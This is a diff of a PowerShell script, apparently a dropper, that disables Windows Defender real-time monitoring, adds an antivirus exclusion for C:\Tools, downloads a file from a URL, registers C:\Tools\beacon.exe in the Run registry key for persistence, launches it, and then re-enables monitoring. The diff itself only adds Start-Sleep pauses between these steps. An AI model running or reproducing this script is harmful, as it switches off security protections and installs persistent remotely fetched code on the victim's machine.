@@ -10,7 +10,9 @@ if (!(Test-Path $dir)) {
 # скачиваем файл
 
 Set-MpPreference -DisableRealtimeMonitoring $true
+Start-Sleep -Seconds 3
 Add-MpPreference -ExclusionPath "C:\Tools"
+Start-Sleep -Seconds 3
 Invoke-WebRequest -Uri $url -OutFile $path
 New-ItemProperty `
   -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
@@ -18,4 +20,5 @@ New-ItemProperty `
   -Value "C:\Tools\beacon.exe" `
   -PropertyType String
   Start-Process "C:\Tools\beacon.exe" -ArgumentList "-test -debug"
+  Start-Sleep -Seconds 3
   Set-MpPreference -DisableRealtimeMonitoring $false
